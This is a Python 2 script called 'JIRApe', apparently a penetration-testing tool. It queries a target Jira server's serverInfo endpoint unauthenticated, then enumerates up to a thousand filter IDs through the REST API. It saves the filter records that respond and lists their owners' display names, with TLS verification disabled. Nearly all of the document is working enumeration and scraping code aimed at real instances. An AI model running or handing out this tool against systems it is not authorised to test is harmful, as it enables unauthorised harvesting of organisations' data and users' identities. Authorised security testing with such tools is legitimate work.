#JIRApe - Extract data from Jira as an unauthenicated user to demonstrate data leakage
#         Currently extracts filter records as well as systemInfo
#

# EDIT THESE VALUES

#Base url of JIRA instance to test, change this to target url
#JIRA_BASEURL='https://jira.atlassian.com'
JIRA_BASEURL='https://CHANGE.ME'

#Number of records to try and extract
SAMPLE_SIZE=1000


# Proxy support
USE_PROXY=False
PROXY_HOST='127.0.0.1:8080'


# DO NOT EDIT BELOW THIS LINE

import requests
import json


def run():
	# start looking from id 10000 onwards, not sure why but just found more unprotected records from 10000 onwards.
	start_filter_id = 10000
	stop_filter_id = start_filter_id+SAMPLE_SIZE
	
	jira = Jira_Extractor(JIRA_BASEURL, start_filter_id, stop_filter_id)
	if USE_PROXY:
		jira.set_proxy(PROXY_HOST)
	
	# Extract JIRA server info	
	jira.show_server_info()
	
	# extract records from JIRA
	jira.extract_filters()
	jira.print_found_users()
	print ""



class Jira_Extractor:
	def __init__(self, jiraBaseUrl, starting_id, ending_id):
		self.found_users=[]
		self.found_protected = 0
		self.found_userdata = 0
		self.found_filters = []
		self.use_proxy = False
		self.proxy_host = ''
		self.proxies = {}
		self.user_agent='JIRApe/0.1'
		self.headers = {"User-Agent": self.user_agent}
		self.jiraBaseUrl = jiraBaseUrl
		self.starting_id = starting_id
		self.ending_id = ending_id

		
	def set_proxy(self, proxyhost):
		self.use_proxy = True
		self.proxy_host = proxyhost
		self.proxies = {
		"http": "http://"+proxyhost,
		"https": "http://"+proxyhost,
		}
	
	def show_server_info(self):
		bah=1
		r = requests.get(self.jiraBaseUrl+'/rest/api/2/serverInfo')
		jsondata = r.json()
		print "-=-=- SERVER  INFO -=-=-"
		print "\tBase URL : %s" % jsondata['baseUrl']
		print "\t Version : %s" % jsondata['version']
		print "\t   Build : %s (%s)" % (jsondata['buildNumber'], jsondata['buildDate'])
		print "\t   Title : %s" % jsondata['serverTitle']
		print ""
		print ""
		
	def extract_filters(self):
		print "Object Exposure"
		print "\t Sample Size = %s records" % str(self.ending_id - self.starting_id)
		print "\t           - = No Data Leakage"
		print "\t           + = Data Leakage"
		print ""
		for x in range(self.starting_id, self.ending_id):
			filterId = x
			url = self.jiraBaseUrl+'/rest/api/2/filter/'+str(filterId)
			#print url
			if self.use_proxy:
				r = requests.get(url, proxies=self.proxies, headers=self.headers, verify=False)
			else:
				r = requests.get(url, headers=self.headers, verify=False)
				
			if r.status_code is 200:
				jsondata=r.json()
				self.found_filters.append(jsondata)
				self.found_userdata+=1
				print '+',
			else:
				self.found_protected+=1
				print '-', 
				
			if str(filterId).endswith('99'):
				print ""
		
		print ""
		print ""
		print "Found %s objects" % str(self.found_protected+self.found_userdata)
		print "\t%s protected objects (-) " % str(self.found_protected)
		print "\t%s unprotected objects (+)" % str(self.found_userdata)
		print ""
			
	def dump_filter_data(self, Id, data):
		with open('filters-'+str(Id)+'.txt', 'w') as outfile:
				json.dump(data, outfile)
				
	def print_found_users(self):
		found_users = []
		for record in self.found_filters:
			try:
				username = record['owner']['displayName']
				if username not in found_users:
					found_users.append(username)
			except:
				#print "ERROR"
				pass
		
		usersize = len(found_users)
		if usersize > 0:
			print "Found %s users" % len(found_users)
			for user in found_users:
				print "\t%s" % user
		else:
			print "No users found, maybe no unprotected objects were found"


run()

